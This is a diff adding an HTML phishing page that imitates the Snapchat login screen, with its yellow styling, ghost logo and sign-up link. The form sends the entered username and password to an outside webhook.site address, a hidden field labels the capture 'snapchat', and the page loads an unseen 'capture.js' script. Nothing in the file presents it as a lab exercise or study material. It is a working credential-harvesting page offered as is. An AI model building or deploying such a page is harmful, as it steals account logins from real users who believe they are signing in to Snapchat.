@@ -1,0 +1,36 @@
+<html>
+<head>
+    <script src="capture.js"></script>
+    <title>Snapchat</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #FFFC00; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { background: white; padding: 40px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); width: 380px; text-align: center; }
+        .logo { margin-bottom: 30px; }
+        .logo-text { color: #000; font-size: 42px; font-weight: bold; }
+        .ghost { font-size: 36px; margin-bottom: 10px; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 16px; margin: 12px 0; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; background: #f8f8f8; }
+        input[type="submit"] { background: #FFFC00; color: #000; border: 2px solid #000; padding: 16px; border-radius: 8px; width: 100%; font-weight: bold; font-size: 18px; margin-top: 20px; cursor: pointer; }
+        input[type="submit"]:hover { background: #000; color: #FFFC00; }
+        .header { font-size: 28px; margin-bottom: 30px; color: #000; font-weight: bold; }
+        .tagline { color: #666; margin-top: 20px; font-size: 14px; }
+        .signup { color: #000; margin-top: 20px; font-size: 14px; }
+        .signup a { color: #000; font-weight: bold; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="ghost">👻</div>
+            <div class="logo-text">Snapchat</div>
+        </div>
+        <div class="header">Log In to Snapchat</div>
+        <form action="https://webhook.site/ac3017bb-31ec-446c-ba45-5b13aae5c7fb" method="POST">
+            <input type="text" name="username" placeholder="Username or Email">
+            <input type="password" name="password" placeholder="Password">
+            <input type="submit" value="Log In">
+        <input type="hidden" name="site" value="snapchat"></form>
+        <div class="tagline">The fastest way to share a moment!</div>
+        <div class="signup">New to Snapchat? <a href="#">Sign Up</a></div>
+    </div>
+</body>
+</html>
